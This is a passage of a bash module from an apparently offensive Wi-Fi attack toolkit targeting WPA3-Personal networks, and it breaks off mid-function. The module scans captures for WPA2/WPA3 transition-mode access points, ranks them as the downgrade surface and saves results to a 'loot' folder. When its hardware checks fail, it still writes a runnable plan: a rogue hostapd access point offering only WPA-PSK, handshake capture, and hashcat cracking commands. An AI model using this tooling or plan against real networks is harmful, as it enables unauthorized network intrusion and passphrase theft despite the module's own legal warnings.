#!/usr/bin/env bash
# 47_wpa3_attack — WPA3 / SAE Attack
# SAE dictionary, Dragonblood downgrade and transition-mode capture.
#
# Standalone top-level module. Self-locating and pkexec-safe: the polkit rule
# matches this script's path, so invoke it directly, never through `env`.

set -o pipefail

if [[ -z "${WIFISTING_ROOT:-}" ]]; then
    _sl_src="${BASH_SOURCE[0]}"
    while [ -L "$_sl_src" ]; do
        _sl_dir="$(cd -P "$(dirname "$_sl_src")" && pwd)"
        _sl_tgt="$(readlink "$_sl_src")"
        [[ "$_sl_tgt" != /* ]] && _sl_tgt="$_sl_dir/$_sl_tgt"
        _sl_src="$_sl_tgt"
    done
    WIFISTING_ROOT="$(cd -P "$(dirname "$_sl_src")/.." && pwd)"
    export WIFISTING_ROOT
fi
if [[ -n "${WIFISTING_ROOT:-}" ]]; then
    _real_home="$(dirname "$WIFISTING_ROOT")"
    if [[ -n "$_real_home" && -d "$_real_home" && "$HOME" != "$_real_home" ]]; then
        export HOME="$_real_home"
    fi
    unset _real_home
fi

: "${TMP_DIR:=/tmp/wifisting}"
: "${LOOT_DIR:=$WIFISTING_ROOT/loot}"
: "${LOG_DIR:=$WIFISTING_ROOT/logs}"
: "${CAPTURES_DIR:=$WIFISTING_ROOT/captures}"

MOD_TMP="$TMP_DIR/wpa3_attack"
MOD_LOOT="$LOOT_DIR/wpa3_attack"
MOD_LOGS="$LOG_DIR/wpa3_attack"
MOD_CAPS="$CAPTURES_DIR/wpa3_attack"
mkdir -p "$MOD_TMP" "$MOD_LOOT" "$MOD_LOGS" "$MOD_CAPS" 2>/dev/null

# ─────────────────────────────────────────────────────────────────────────
# 47_wpa3_attack — WPA3-Personal / SAE attack surface
#
# Scope: WPA3-Personal ONLY. WPA3-Enterprise (AKM 12/13/24/25, EAP-TLS with
# SAE-style forward secrecy) is 13_802.1x_relay.sh territory and is only
# *labelled* here, never attacked.
#
# Capability model. This host has one monitor-capable radio (wlp5s0, currently
# in monitor mode), no second adapter and no WPA3 target. Every offline path
# below therefore does real work; every path that would transmit refuses by
# name and, where a downgrade is at stake, writes a runnable plan instead.
# Nothing here claims a crack it did not produce.
# ─────────────────────────────────────────────────────────────────────────

W3_RESULTS="$MOD_LOOT/transition.tsv"

# ── tool + radio probes ──────────────────────────────────────────────────

w3_have() { command -v "$1" >/dev/null 2>&1; }

w3_tool_path() { command -v "$1" 2>/dev/null || printf 'MISSING\n'; }

w3_scapy_ver() {
    python3 -c 'import scapy;print(scapy.__version__)' 2>/dev/null || printf 'MISSING\n'
}

# 1 when the interface is currently in monitor mode.
w3_iface_is_mon() {
    [[ -n "$1" ]] || return 1
    [[ -e "/sys/class/net/$1/phy80211" ]] || return 1
    iw dev "$1" info 2>/dev/null | grep -q 'type monitor'
}

# Phy-level monitor capability, independent of the current type. This is what
# makes wlp5s0 "monitor-capable" even while it sits in managed mode.
w3_iface_mon_capable() {
    [[ -n "$1" ]] || return 1
    local phy
    phy=$(cat "/sys/class/net/$1/phy80211/name" 2>/dev/null) || return 1
    [[ -n "$phy" ]] || return 1
    iw phy "$phy" info 2>/dev/null | grep -q '^\s*\* monitor'
}

w3_mon_iface() {
    local i n
    for i in /sys/class/net/*/; do
        [[ -e "$i/phy80211" ]] || continue
        n=$(basename "$i")
        w3_iface_is_mon "$n" && { printf '%s\n' "$n"; return 0; }
    done
    return 1
}

w3_any_iface() {
    local i n
    for i in /sys/class/net/*/; do
        [[ -e "$i/phy80211" ]] || continue
        n=$(basename "$i")
        printf '%s\n' "$n"
    done
}

# All wireless PHYs on the host. The downgrade path needs a radio that can be
# an AP while another receives, so the count matters.
w3_phy_count() {
    local i n seen="" c=0
    for i in /sys/class/net/*/; do
        [[ -e "$i/phy80211" ]] || continue
        n=$(cat "$i/phy80211/name" 2>/dev/null) || continue
        [[ -n "$n" ]] || continue
        case " $seen " in *" $n "*) continue ;; esac
        seen="$seen $n"; c=$((c + 1))
    done
    printf '%s\n' "$c"
}

# Does the phy behind $1 advertise AP mode in `iw phy info`?
w3_ap_capable() {
    [[ -n "$1" ]] || return 1
    local phy
    phy=$(cat "/sys/class/net/$1/phy80211/name" 2>/dev/null) || return 1
    iw phy "$phy" info 2>/dev/null | grep -qE '^\s*\* AP$'
}

# Injection can only be *verified* by transmitting and observing an effect.
# With no second adapter and no target that is impossible, so this reports the
# honest middle state rather than the 1/0 the other modules print.
w3_injection_state() {
    local mon="${1:-}"
    if [[ -z "$mon" ]]; then printf 'no-monitor\n'; return 0; fi
    if [[ "$(id -u)" != "0" ]]; then printf 'unverified-need-root\n'; return 0; fi
    if ! w3_have aircrack-ng; then printf 'unverified-no-aircrack\n'; return 0; fi
    printf 'unverified-no-target\n'
}

w3_status_tsv() {
    # Offline analysis capability: all of this works on this host and needs
    # no radio, so it is reported separately from the RADIO section below.
    printf 'section\tOFFLINE\n'
    printf 'python3\t%s\n' "$(w3_have python3 && echo 1 || echo 0)"
    printf 'scapy\t%s|%s\n' \
        "$(python3 -c 'import scapy' 2>/dev/null && echo 1 || echo 0)" "$(w3_scapy_ver)"
    printf 'hashcat\t%s|%s\n' \
        "$(w3_have hashcat && echo 1 || echo 0)" "$(w3_tool_path hashcat)"
    printf 'hcxpcapngtool\t%s|%s\n' \
        "$(w3_have hcxpcapngtool && echo 1 || echo 0)" "$(w3_tool_path hcxpcapngtool)"
    printf 'hcxdumptool\t%s|%s\n' \
        "$(w3_have hcxdumptool && echo 1 || echo 0)" "$(w3_tool_path hcxdumptool)"
    printf 'aircrack-ng\t%s|%s\n' \
        "$(w3_have aircrack-ng && echo 1 || echo 0)" "$(w3_tool_path aircrack-ng)"
    printf 'tshark\t%s\n' "$(w3_have tshark && echo 1 || echo 0)"
    printf 'iw\t%s\n' "$(w3_have iw && echo 1 || echo 0)"
    printf 'hashcat_mode_22000\t%s\n' "$(w3_have hashcat && echo 1 || echo 0)"
    printf 'offline_analysis\t1\n'
    printf 'offline_transition_detect\t1\n'
    printf 'offline_plan_gen\t1\n'
    printf 'offline_dragonblood_assess\t1\n'

    # RADIO section: presence is not capability, so each line names the state.
    printf 'section\tRADIO\n'
    local mon any phy
    mon=$(w3_mon_iface 2>/dev/null || true)
    any=$(w3_any_iface 2>/dev/null | tr '\n' ',' | sed 's/,$//')
    phy=$(w3_phy_count)
    printf 'monitor_iface\t%s\n' "${mon:-none}"
    printf 'wireless_ifaces\t%s\n' "${any:-none}"
    printf 'wireless_phys\t%s\n' "$phy"
    printf 'monitor_capable\t%s\n' "$([[ -n "$mon" ]] && echo 1 || echo 0)"
    printf 'injection_verified\t0\n'
    printf 'injection_state\t%s\n' "$(w3_injection_state "$mon")"
    printf 'ap_mode_phy\t%s\n' "$([[ -n "$mon" ]] && w3_ap_capable "$mon" && echo 1 || echo 0)"
    printf 'hostapd\t%s\n' "$(w3_have hostapd && echo 1 || echo 0)"
    printf 'second_adapter\t%s\n' "$(( phy > 1 ? 1 : 0 ))"
    printf 'radio_actions_available\t%s\n' \
        "$([[ -n "$mon" ]] && w3_have hostapd && (( phy > 1 )) && echo 1 || echo 0)"
    printf 'wpa3_target_seen\t%s\n' \
        "$([[ -s "$W3_RESULTS" ]] && awk -F'\t' 'NR>1 && $3=="TRANSITION"{f=1} END{print f+0}' "$W3_RESULTS" || echo 0)"
    return 0
}

w3_check_deps() {
    local rc=0 t
    for t in python3 hashcat hcxpcapngtool hcxdumptool aircrack-ng iw; do
        if w3_have "$t"; then printf 'OK\t%s\t%s\n' "$t" "$(w3_tool_path "$t")"
        else printf 'MISSING\t%s\t-\n' "$t"; rc=1; fi
    done
    if python3 -c 'import scapy' 2>/dev/null; then
        printf 'OK\tscapy\t%s\n' "$(w3_scapy_ver)"
    else
        printf 'MISSING\tscapy\tpython3 -m pip install scapy\n'; rc=1
    fi
    local mon; mon=$(w3_mon_iface 2>/dev/null || true)
    printf 'RADIO\tmonitor_iface\t%s\n' "${mon:-none}"
    printf 'RADIO\tinjection_verified\t0\n'
    printf 'NOTE\tradio actions need an injection-verified adapter and a second\n'
    printf 'NOTE\tadapter for the rogue AP; offline analysis needs neither.\n'
    return $rc
}

# ── argument-shape handling ──────────────────────────────────────────────
# Two callers use different argument orders for the same verbs:
#   modules/29_killchain.sh : --downgrade BSSID ESSID CHANNEL DUR
#   native/src/main1.c GUI  : --downgrade IFACE BSSID CHANNEL DUR
# Rather than guess, both shapes are decoded explicitly and printed, so a
# wrong invocation is visible in the output instead of silently misread.

w3_is_mac() {
    [[ "$1" =~ ^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$ ]]
}

w3_is_iface() {
    [[ -n "$1" && -e "/sys/class/net/$1" ]]
}

# Emits: TYPE, BSSID, ESSID, IFACE, CHANNEL, DUR  (one KEY\tVALUE per line).
w3_parse_target() {
    local a1="$1" a2="$2" a3="$3" a4="$4"
    local iface="" bssid="" essid="" chan="" dur=""
    if [[ -z "$a1" ]]; then
        printf 'ERROR\tusage: needs BSSID ESSID CHANNEL [DUR]\n' >&2
        return 2
    fi
    if w3_is_mac "$a1"; then
        # killchain shape: BSSID ESSID CHANNEL [DUR]
        bssid="$a1"; essid="$a2"; chan="$a3"; dur="$a4"
        printf 'TYPE\tkillchain\n'
    elif w3_is_iface "$a1"; then
        # GUI shape: IFACE BSSID CHANNEL [DUR]
        iface="$a1"; bssid="$a2"; chan="$a3"; dur="$a4"
        printf 'TYPE\tgui\n'
    else
        printf 'ERROR\t%s is neither a BSSID (aa:bb:cc:dd:ee:ff) nor a local interface\n' \
            "$a1" >&2
        return 2
    fi
    printf 'BSSID\t%s\nESSID\t%s\nIFACE\t%s\nCHANNEL\t%s\nDUR\t%s\n' \
        "${bssid:-}" "${essid:-}" "${iface:-}" "${chan:-}" "${dur:-}"
}

w3_chan_ok() {
    [[ "$1" =~ ^[0-9]+$ ]] && (( $1 >= 1 && $1 <= 233 ))
}

# ── offline classification ───────────────────────────────────────────────

w3_classify_aki() {
    local raw="$1"
    [[ -z "$raw" ]] && { printf 'ERROR\tno AKM suites given\n' >&2; return 2; }
    python3 -c '
import sys, re
raw = sys.argv[1]
bits = {"psk": 0, "sae": 0, "owe": 0, "wpa3ent": 0, "ent192": 0,
        "entsha384": 0, "pasn": 0, "fils": 0, "eppke": 0, "unk": 0}
for tok in re.split(r"[\s,/+]+", raw):
    t = tok.strip().lower()
    if not t: continue
    if t.startswith("0x") or t.isdigit():
        # AKM suites are 32-bit OUI+selector values (0x000fac08). Only the
        # low selector byte identifies the AKM, so every comparison below is
        # against sel. Comparing the whole value silently matched nothing.
        #
        # `tshark -T fields` prints this FT_UINT32 field as DECIMAL
        # (1027074 == 0x000FAC02 == PSK), while a hand-written fixture tends
        # to use hex. Both spellings must be accepted: handling only 0x is
        # what made a real capture classify as UNKNOWN.
        try:
            v = int(t, 16) if t.startswith("0x") else int(t, 10)
        except ValueError:
            bits["unk"] = 1; continue
        sel = v & 0xff
        # Selector byte per hostapd src/common/defs.h (RSN_AUTH_KEY_MGMT_*),
        # which is the authoritative list:
        #   2 PSK, 4 FT-PSK, 6 PSK-SHA256
        #   8 SAE, 9 FT-SAE                            <- WPA3-Personal
        #   12 802.1X-SUITE-B-192, 23 802.1X-SHA384, 19/20 PSK-SHA384
        #   14-17 FILS, 18 OWE, 21 PASN, 29 EPPKE
        #   24 SAE-EXT-KEY, 25 FT-SAE-EXT-KEY          <- WPA3-Enterprise
        # NB: 24/25 are NOT SAE-Personal. They are the WPA3-Enterprise modes
        # (SAE-EXT-KEY) and belong to 13_802.1x_relay.sh.
        if   sel == 2:  bits["psk"] = 1
        elif sel == 4:  bits["psk"] = 1
        elif sel == 6:  bits["psk"] = 1
        elif sel == 8:  bits["sae"] = 1
        elif sel == 9:  bits["sae"] = 1
        elif sel == 18: bits["owe"] = 1
        elif sel == 24: bits["wpa3ent"] = 1
        elif sel == 25: bits["wpa3ent"] = 1
        elif sel in (12, 23): bits["ent192"] = 1
        elif sel in (19, 20): bits["entsha384"] = 1
        elif sel == 21: bits["pasn"] = 1
        elif sel in (14, 15, 16, 17): bits["fils"] = 1
        elif sel == 29: bits["eppke"] = 1
        else: bits["unk"] = 1
    elif t == "wpa3": bits["sae"] = 1
    elif t == "wpa2": bits["psk"] = 1
    elif t == "psk": bits["psk"] = 1
    elif t == "sae": bits["sae"] = 1
    else: bits["unk"] = 1
matched = [k for k in bits if bits[k]]
reasons = "|".join(sorted(matched))
# Declaration order IS the precedence. The enterprise branch is evaluated
# before the personal ones because a beacon advertising WPA3-Enterprise is
# not a WPA3-Personal target, and because 24/25 would otherwise be mistaken
# for SAE.
#
# Unknown AKM values make the row unclassifiable rather than guessed at, so
# that branch is first.
if bits["unk"]:
    cls = "UNKNOWN"
elif bits["wpa3ent"]:
    if bits["sae"] or bits["psk"]:
        # WPA3-Enterprise advertised alongside a personal AKM: a real
        # combination, and exactly what must not be read as a personal SAE
        # target without an explicit decision.
        cls = "WPA3-ENTERPRISE-MIXED"
    else:
        cls = "WPA3-ENTERPRISE-only"
elif bits["ent192"] or bits["entsha384"]:
    if bits["sae"] or bits["psk"]:
        cls = "WPA3-ENTERPRISE-MIXED"
    else:
        cls = "WPA2-ENTERPRISE-SHA384-only"
elif bits["sae"] and bits["psk"]:
    cls = "TRANSITION"
elif bits["sae"]:
    cls = "WPA3-only"
elif bits["psk"]:
    cls = "WPA2-only"
elif bits["owe"]:
    cls = "OWE-only"
elif bits["fils"] or bits["pasn"]:
    cls = "FILS-PASN-out-of-scope"
elif bits["eppke"]:
    cls = "EPPKE-only"
else:
    cls = "NONE"
print("%s\t%s" % (cls, reasons or "none"))
' "$raw"
}

# Split 0x000fac04 into 000fac 04; the low byte is the AKM selector and
# 0x000fac is the OUI for every value that matters here.
w3_aki_parts() {
    python3 -c '
import sys, re
raw = sys.argv[1].strip().lower().replace(":", "").replace(" ", "")
if raw.startswith("0x"): raw = raw[2:]
if not re.fullmatch(r"[0-9a-f]+", raw or "z"):
    print("ERROR\tnot a hex AKM suite value: %s" % sys.argv[1])
    sys.exit(2)
v = int(raw, 16)
print("HEX\t0x%08x" % v)
print("OUI\t%s" % (raw[:-2].zfill(6) if len(raw) > 2 else "000000"))
print("SEL\t0x%s" % (raw[-2:].zfill(2) if len(raw) > 2 else raw.zfill(2)))
' "$1"
}

# ── transition-mode detection (offline) ──────────────────────────────────

# Split a TAB-separated line into W3_F[], preserving empty fields.
# A tab is IFS *whitespace*, so `IFS=$'\t' read -r bssid ssidhex akis`
# collapses runs of adjacent tabs and shifts every later field left: a
# hidden-SSID AP arrives as "BSSID\t\t0x000fac02 0x000fac08", which reads as
# ssidhex=<AKM list> akis="", so the AKM suites land in the ESSID column and
# the AP is classified UNKNOWN instead of TRANSITION. The same hazard applies
# to the ROW lines w3_transition_render consumes.
w3_split_tab() {
    W3_F=()
    local line="$1"
    while [[ "$line" == *$'\t'* ]]; do
        W3_F+=( "${line%%$'\t'*}" )
        line="${line#*$'\t'}"
    done
    W3_F+=( "$line" )
}

# airodump-ng CSV is 15 columns; a 5-column synthetic/shorthand row is
# BSSID,ESSID,PRIVACY,AUTH,CIPHER. Either is accepted and the choice is
# reported so the caller knows which parser ran.
w3_transition_parse() {
    local mode="$1" srcfile="$2"
    python3 -c '
import sys, csv, io, re
mode, src = sys.argv[1], sys.argv[2]
data = sys.stdin.read()
if src == "-":
    src = "stdin"
lines = data.splitlines()
rows = list(csv.reader(io.StringIO(data)))
maxf = max((len(r) for r in rows), default=0)
if mode == "auto":
    if maxf >= 14: mode = "airodump"
    elif maxf >= 5: mode = "shorthand"
    else: mode = "airodump"
print("MODE\t%s" % mode)
print("SRC\t%s" % src)

def sh(s): return (s or "").strip()
def uq(s): return sh(s).strip().strip(chr(34))

if mode == "airodump":
    pr_i, au_i, ci_i, es_i = 5, 7, 6, 13
    n = 0
    for r in rows:
        if len(r) <= es_i: continue
        bssid = sh(r[0])
        if not re.fullmatch(r"(?i)([0-9a-f]{2}:){5}[0-9a-f]{2}", bssid): continue
        if sh(r[0]).upper().startswith("STATION"): continue
        n += 1
        print("ROW\t%s\t%s\t%s\t%s\t%s" % (uq(r[es_i]), bssid, uq(r[pr_i]), uq(r[au_i]), uq(r[ci_i])))
    print("ROWS\t%d" % n)
else:
    n = 0
    for r in rows:
        if len(r) < 5: continue
        bssid = sh(r[0])
        if not re.fullmatch(r"(?i)([0-9a-f]{2}:){5}[0-9a-f]{2}", bssid): continue
        n += 1
        print("ROW\t%s\t%s\t%s\t%s\t%s" % (uq(r[1]), bssid, uq(r[2]), uq(r[3]), uq(r[4])))
    print("ROWS\t%d" % n)
' "$mode" "$srcfile"
}

w3_transition_from_pcap() {
    local pcap="$1"
    w3_have tshark || { printf 'ERROR\ttshark needed to read a capture\n' >&2; return 1; }
    local raw
    raw=$(tshark -r "$pcap" -Y 'wlan.rsn.akms' -T fields \
            -e wlan.bssid -e wlan.ssid -e wlan.rsn.akms 2>/dev/null | sort -u) || true
    if [[ -z "$raw" ]]; then
        printf 'ERROR\tno RSN AKM suites in %s (not a beacon/probe capture, or RSN absent)\n' \
            "$pcap" >&2
        return 1
    fi
    local bssid ssidhex akis ssid
    local row
    while IFS= read -r row; do
        w3_split_tab "$row"
        bssid="${W3_F[0]:-}"; ssidhex="${W3_F[1]:-}"; akis="${W3_F[2]:-}"
        [[ -n "$bssid" ]] || continue
        ssid=$(printf '%s' "$ssidhex" | xxd -r -p 2>/dev/null | tr -d '\0')
        # tshark prints AKM suites as 0x000fac04-style values.
        printf 'ROW\t%s\t%s\tRSN\t%s\tunknown\n' "$ssid" "$bssid" "$akis"
    done <<< "$raw"
}

# Reads rows from stdin; emits BSSID, ESSID, CLASS, REASON ordered with
# TRANSITION first because that is the exploitable set.
w3_transition_render() {
    printf 'BSSID\tESSID\tCLASS\tREASON\n'
    local line ssid bssid priv auth cipher aki c
    while IFS= read -r line; do
        # The ESSID is the second field and is empty for a hidden-SSID AP;
        # a collapsing read would pull the BSSID into the ESSID column and
        # shift the privacy/AKM columns out from under the classifier.
        w3_split_tab "$line"
        tag="${W3_F[0]:-}"; ssid="${W3_F[1]:-}"; bssid="${W3_F[2]:-}"
        priv="${W3_F[3]:-}"; auth="${W3_F[4]:-}"; cipher="${W3_F[5]:-}"
        [[ "$tag" == "ROW" ]] || continue
        aki="$auth"
        # Fold a WPA3 marker in the cipher column into the AKM token list.
        case "$cipher" in
            *[Ss][Aa][Ee]*) aki="$aki wpa3" ;;
        esac
        case "$priv" in
            *[Ss][Aa][Ee]*) aki="$aki wpa3" ;;
        esac
        c=$(w3_classify_aki "$aki" 2>/dev/null | awk -F'\t' '{print $1"\t"$2}')
        [[ -n "$c" ]] || c=$'UNKNOWN\tunparsed'
        printf '%s\t%s\t%s\n' "$bssid" "$ssid" "$c"
    done
}

w3_transition_tsv() {
    local arg="${1:-}"
    local tmp="$MOD_TMP/transition.$$.rows"
    local body="$MOD_TMP/transition.$$.body"
    local mode="auto" srcfile="-"
    # Single-exit function, so scratch is removed on the error paths too.
    # (trap ... RETURN would also fire on every nested function return and
    # delete the files mid-pipeline.)
    if [[ -n "$arg" && "$arg" != "-" ]]; then
        if [[ ! -e "$arg" ]]; then
            printf 'ERROR\tno such file: %s\n' "$arg" >&2
            return 2
        fi
        case "$arg" in
            *.pcap|*.pcapng|*.cap) mode="pcap" ;;
        esac
        srcfile="$arg"
    fi
    local rc=0
    if [[ "$mode" == "pcap" ]]; then
        w3_transition_from_pcap "$srcfile" > "$tmp" || rc=1
    elif [[ "$srcfile" == "-" ]]; then
        w3_transition_parse auto - > "$tmp" || rc=1
    else
        w3_transition_parse auto "$srcfile" < "$srcfile" > "$tmp" || rc=1
    fi
    if (( rc != 0 )); then
        rm -f "$tmp" "$body"
        return 1
    fi

    local rows
    rows=$(awk -F'\t' '$1=="ROWS"{print $2}' "$tmp")
    if [[ -z "$rows" ]]; then rows=$(grep -c '^ROW' "$tmp" 2>/dev/null || echo 0); fi
    if [[ "${rows:-0}" == "0" ]]; then
        rm -f "$tmp" "$body"
        printf 'ERROR\tno parseable AP rows (expected BSSID,ESSID,PRIVACY,AUTH,CIPHER or airodump CSV)\n' >&2
        return 1
    fi

    printf 'SOURCE\t%s\n' "$srcfile"
    printf 'MODE\t%s\n' "$(awk -F'\t' '$1=="MODE"{print $2}' "$tmp")"
    printf 'APS\t%s\n' "$rows"
    printf 'TABLE\n'

    w3_transition_render < "$tmp" > "$body"

    local t w2 w3o other ntrans nw3 nw2 nent
    t=$(awk -F'\t' 'NR>1 && $3=="TRANSITION"{c++} END{print c+0}' "$body")
    w3o=$(awk -F'\t' 'NR>1 && $3=="WPA3-only"{c++} END{print c+0}' "$body")
    w2=$(awk -F'\t' 'NR>1 && $3=="WPA2-only"{c++} END{print c+0}' "$body")
    nent=$(awk -F'\t' 'NR>1 && $3 ~ /ENTERPRISE/{c++} END{print c+0}' "$body")
    other=$(awk -F'\t' 'NR>1 && $3!="TRANSITION" && $3!="WPA3-only" && $3!="WPA2-only" && $3 !~ /ENTERPRISE/{c++} END{print c+0}' "$body")

    # TRANSITION rows first: that is the downgrade surface.
    awk -F'\t' 'NR==1{print; next} $3=="TRANSITION"{print}' "$body"
    awk -F'\t' 'NR>1 && $3!="TRANSITION"{print}' "$body"

    printf 'SECTION\tSUMMARY\n'
    printf 'TRANSITION\t%s\n' "$t"
    printf 'WPA3_only\t%s\n' "$w3o"
    printf 'WPA2_only\t%s\n' "$w2"
    printf 'ENTERPRISE_out_of_scope\t%s\n' "$nent"
    printf 'OTHER\t%s\n' "$other"
    printf 'DOWNGRADE_SURFACE\t%s\n' "$t"

    mkdir -p "$MOD_LOOT"
    { printf 'BSSID\tESSID\tCLASS\tREASON\n'; cat "$body"
      printf 'SECTION\tSUMMARY\nTRANSITION\t%s\nWPA3_only\t%s\nWPA2_only\t%s\n' "$t" "$w3o" "$w2"
    } > "$W3_RESULTS" 2>/dev/null || true
    printf 'RESULTS\t%s\n' "$W3_RESULTS"
    rm -f "$tmp" "$body"
    return 0
}

# ── gated radio actions ──────────────────────────────────────────────────

# Shared gate. Prints every failing prerequisite by name and returns 1;
# returns 0 only when a downgrade could actually be attempted.
w3_radio_gate() {
    local verb="$1" iface="$2" rc=0
    printf 'GATE\t%s\n' "$verb"
    # Overrides exist only so --selftest can exercise every refusal branch on
    # any host. Nothing in normal operation sets them.
    local f_phys="${W3_FORCE_PHYS:-}"

    if ! w3_have iw; then
        printf 'MISSING\tiw (interface capability cannot be probed without it)\n' >&2
        rc=1
    fi

    # 1. A monitor-capable radio to receive with.
    local mon="" moncap=""
    mon=$(w3_mon_iface 2>/dev/null || true)
    if [[ -n "$mon" ]]; then
        printf 'PREREQ\tmonitor_iface\t%s\n' "$mon"
    else
        local i n
        for i in /sys/class/net/*/; do
            [[ -e "$i/phy80211" ]] || continue
            n=$(basename "$i")
            w3_iface_mon_capable "$n" && { moncap="$n"; break; }
        done
    fi
    if [[ -z "$mon" && -z "$moncap" ]]; then
        printf 'MISSING\tmonitor-capable radio: no wireless interface on this host can enter monitor mode\n' >&2
        rc=1
    elif [[ -z "$mon" ]]; then
        printf 'PREREQ\tmonitor_capable\t%s (currently not in monitor mode; needs root to switch)\n' "$moncap"
    fi

    if [[ -n "$iface" && ! -e "/sys/class/net/$iface" ]]; then
        printf 'MISSING\tinterface %s does not exist\n' "$iface" >&2; rc=1
    fi

    # 2. hostapd is what actually transmits the rogue SSID.
    if ! w3_have hostapd; then
        printf 'MISSING\thostapd (the rogue AP is hostapd, not a raw beacon flood)\n' >&2
        rc=1
    else
        printf 'PREREQ\thostapd\t%s\n' "$(w3_tool_path hostapd)"
    fi
    if ! w3_have dnsmasq; then
        printf 'MISSING\tdnsmasq (DHCP for the rogue AP; a client that never gets a lease never completes the 4-way handshake)\n' >&2
    fi

    # 3. One radio cannot be the AP and the receiver at the same time, so a
    #    second wireless phy is a hard prerequisite, not a nicety.
    local phy; phy=$(w3_phy_count)
    [[ -n "$f_phys" ]] && phy="$f_phys"
    if (( phy < 2 )); then
        printf 'MISSING\tsecond radio: the rogue AP must transmit while another adapter receives, and this host has %s wireless phy\n' \
            "$phy" >&2
        rc=1
    else
        printf 'PREREQ\twireless_phys\t%s\n' "$phy"
    fi

    # 4. Injection is the one thing that cannot be probed without a target:
    #    verification requires transmitting and observing an effect. There is
    #    no WPA3 target and no second adapter here, so it stays unverified and
    #    the gate refuses rather than pretending.
    printf 'INJECTION_VERIFIED\t0\n'
    printf 'MISSING\tinjection-verified adapter: injection can only be confirmed by transmitting and observing an effect, which needs a second adapter or a cooperative target; neither exists on this host\n' >&2
    rc=1

    if [[ "${W3_FORCE_ROOT_OK:-0}" != "1" && "$(id -u)" != "0" ]]; then
        printf 'MISSING\troot (monitor mode, hostapd and channel changes need CAP_NET_ADMIN)\n' >&2
        rc=1
    fi
    return $rc
}

# The plan is a real artifact written on every gated refusal, so a refusal
# with no hardware still leaves something runnable behind.
w3_write_downgrade_plan() {
    local bssid="$1" essid="$2" chan="$3" dur="$4" mon="$5"
    local plan="$MOD_LOOT/downgrade_plan_$(date +%Y%m%d-%H%M%S).tsv"
    mkdir -p "$MOD_LOOT" || return 1
    {
        printf 'PLAN\tWPA3_TRANSITION_DOWNGRADE\n'
        printf 'BSSID\t%s\nESSID\t%s\nCHANNEL\t%s\nDURATION\t%s\n' "$bssid" "$essid" "$chan" "$dur"
        printf 'MONITOR_IFACE\t%s\n' "${mon:-none}"
        printf 'WHY\tThe AP advertises WPA2-PSK alongside WPA3-SAE, so a client that\n'
        printf 'WHY\taccepts the WPA2 AKM derives the PSK through the 4-way handshake\n'
        printf 'WHY\tinstead of SAE. That handshake is crackable offline; SAE itself is\n'
        printf 'WHY\ta PAKE with forward secrecy and is not.\n'
        printf 'STEP\t1\tput a dedicated adapter in AP mode on channel %s (hostapd)\n' "$chan"
        printf 'STEP\t2\tserve the same ESSID with wpa_key_mgmt=WPA-PSK and rsn_pairwise=CCMP\n'
        printf 'STEP\t3\tkeep wpa_key_mgmt=SAE OUT of hostapd.conf: offering SAE re-enables the PAKE\n'
        printf 'STEP\t4\tkeep a second adapter in monitor mode on the client channel\n'
        printf 'STEP\t5\ttake the client through the 4-way handshake and capture it (hcxdumptool or airodump-ng)\n'
        printf 'STEP\t6\thcxpcapngtool -o out.hc22000 capture.pcapng\n'
        printf 'STEP\t7\thashcat -m 22000 out.hc22000 <wordlist>\n'
        printf 'PASS_PHRASE\tThe WPA2 passphrase equals the WPA3 passphrase on a transition-mode AP.\n'
        printf 'LEGAL\tRogue AP transmissions disturb a live network and are illegal without\n'
        printf 'LEGAL\twritten authorization. This plan is emitted, not executed.\n'
    } > "$plan" || return 1
    printf 'PLAN_FILE\t%s\n' "$plan"
    return 0
}

w3_downgrade() {
    local a1="$1" a2="$2" a3="$3" a4="$4"
    local parsed; parsed=$(w3_parse_target "$a1" "$a2" "$a3" "$a4") || return 2
    local bssid essid chan dur iface
    bssid=$(awk -F'\t' '$1=="BSSID"{print $2}' <<< "$parsed")
    essid=$(awk -F'\t' '$1=="ESSID"{print $2}' <<< "$parsed")
    chan=$(awk -F'\t' '$1=="CHANNEL"{print $2}' <<< "$parsed")
    dur=$(awk -F'\t' '$1=="DUR"{print $2}' <<< "$parsed")
    iface=$(awk -F'\t' '$1=="IFACE"{print $2}' <<< "$parsed")

    if ! w3_is_mac "$bssid"; then
        printf 'ERROR\tno BSSID given (got %s); usage: --downgrade BSSID ESSID CHANNEL [DUR] or --downgrade IFACE BSSID CHANNEL [DUR]\n' \
            "${bssid:-<empty>}" >&2
        return 2
    fi
    [[ -n "$essid" ]] || { printf 'ERROR\tno ESSID given\n' >&2; return 2; }
    w3_chan_ok "${chan:-x}" || { printf 'ERROR\tbad channel: %s\n' "${chan:-<empty>}" >&2; return 2; }
    [[ "$dur" =~ ^[0-9]+$ ]] || dur=60

    printf 'VERB\tdowngrade\nBSSID\t%s\nESSID\t%s\nCHANNEL\t%s\nDURATION\t%s\n' \
        "$bssid" "$essid" "$chan" "$dur"
    # A transition-mode AP is the precondition: there is nothing to downgrade
    # on a WPA3-only AP, and the killchain does not check this for us.
    if [[ -s "$W3_RESULTS" ]]; then
        local cls
        cls=$(awk -F'\t' -v b="$(printf '%s' "$bssid" | tr 'A-F' 'a-f')" \
              'NR>1 && tolower($1)==b {print $3; exit}' "$W3_RESULTS" 2>/dev/null)
        [[ -n "$cls" ]] && printf 'CACHED_CLASS\t%s\n' "$cls"
    fi

    local mon; mon=$(w3_mon_iface 2>/dev/null || true)
    if ! w3_radio_gate downgrade "$iface"; then
        printf 'REFUSED\tdowngrade\n'
        printf 'REASON\tthe prerequisites named MISSING above are absent, so no rogue AP is\n'
        printf 'REASON\tstarted and no frame is transmitted. The plan below is emitted\n'
        printf 'REASON\trather than executed.\n'
        w3_write_downgrade_plan "$bssid" "$essid" "$chan" "$dur" "$mon"
        printf 'EXECUTED\t0\n'
        return 1
    fi
    # Reached only if every prerequisite is satisfied. Transmitting a rogue AP
    # is not implemented here, so say that rather than reporting success.
    w3_write_downgrade_plan "$bssid" "$essid" "$chan" "$dur" "$mon"
    printf 'ERROR\tall gate prerequisites passed but this module has no rogue-AP\n' >&2
    printf 'ERROR\ttransmission backend; nothing was transmitted. Use the emitted plan.\n' >&2
    printf 'EXECUTED\t0\n'
    return 1
}

w3_capture() {
    local a1="$1" a2="$2" a3="$3" a4="$4"
    local parsed; parsed=$(w3_parse_target "$a1" "$a2" "$a3" "$a4") || return 2
    local bssid essid chan dur iface
    bssid=$(awk -F'\t' '$1=="BSSID"{print $2}' <<< "$parsed")
    essid=$(awk -F'\t' '$1=="ESSID"{print $2}' <<< "$parsed")
    chan=$(awk -F'\t' '$1=="CHANNEL"{print $2}' <<< "$parsed")
